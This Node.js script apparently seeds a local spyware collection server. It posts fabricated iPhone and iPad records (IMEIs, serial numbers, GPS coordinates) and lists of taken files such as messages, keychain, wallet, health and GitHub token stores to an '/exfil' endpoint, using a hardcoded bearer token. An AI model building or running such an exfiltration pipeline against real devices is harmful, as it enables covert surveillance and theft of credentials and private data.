'use strict';
const http = require('http');

const SECRET = 'a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2';

function post(path, data) {
  return new Promise((resolve, reject) => {
    const body = JSON.stringify(data);
    const req = http.request({ hostname:'127.0.0.1', port:8888, path, method:'POST', headers:{ 'Content-Type':'application/json', 'Authorization':'Bearer '+SECRET, 'Content-Length': Buffer.byteLength(body) } }, res => {
      let d=''; res.on('data',c=>d+=c); res.on('end',()=>resolve(d));
    });
    req.on('error', reject);
    req.end(body);
  });
}

async function main() {
  // Device info
  const infos = [
    { deviceId:'test001', type:'info', data:{ deviceModel:'iPhone 13', chipset:'A15 Bionic', storage:'256GB (189GB used)', battery:'87%', carrier:'China Mobile', imei:'352789104562318', serialNumber:'F4GDQ3MQPN4X', lastLocation:'31.2304, 121.4737' }},
    { deviceId:'test002', type:'info', data:{ deviceModel:'iPhone 15 Pro', chipset:'A17 Pro', storage:'512GB (287GB used)', battery:'94%', carrier:'AT&T', imei:'356821097453612', serialNumber:'G6TDP2N1HG7K', lastLocation:'40.7128, -74.0060' }},
    { deviceId:'test003', type:'info', data:{ deviceModel:'iPad Pro 12.9 (6th gen)', chipset:'M2', storage:'1TB (456GB used)', battery:'72%', carrier:'WiFi Only', serialNumber:'DLXQF3H8Q05P', lastLocation:'37.7749, -122.4194' }},
    { deviceId:'test004', type:'info', data:{ deviceModel:'iPhone 16 Pro Max', chipset:'A18 Pro', storage:'256GB (98GB used)', battery:'100%', carrier:'Vodafone', imei:'359012876543210', serialNumber:'K9RMN4X2V8WL', lastLocation:'51.5074, -0.1278' }},
  ];

  // Files per device
  const files = {
    test001: ['contacts.db:2458624','messages.db:45234176','call_history.db:1234560','safari_history.db:3456789','photos.sqlite:8912345','notes.sqlite:567890','health.db:12345678','keychain-2.db:98304'],
    test002: ['contacts.db:1845320','messages.db:67890432','slack_data.db:23456789','teams_cache.db:15678901','photos.sqlite:15234567','voicemails.db:345678'],
    test003: ['github_tokens.plist:4096','notes.sqlite:23456789','safari_history.db:8765432','icloud_drive.db:5678901'],
    test004: ['contacts.db:3456789','messages.db:34567890','photos.sqlite:25678901','safari_history.db:4567890','health.db:8901234','wallet.db:234567'],
  };

  let ok = 0;
  for (const info of infos) {
    await post('/exfil', info);
    ok++;
  }

  for (const [deviceId, list] of Object.entries(files)) {
    for (const item of list) {
      const [name, size] = item.split(':');
      await post('/exfil', { deviceId, type:'file', name, size: parseInt(size) });
      ok++;
    }
  }

  console.log(`Done: ${ok} requests sent successfully`);
}

main().catch(e => { console.error(e); process.exit(1); });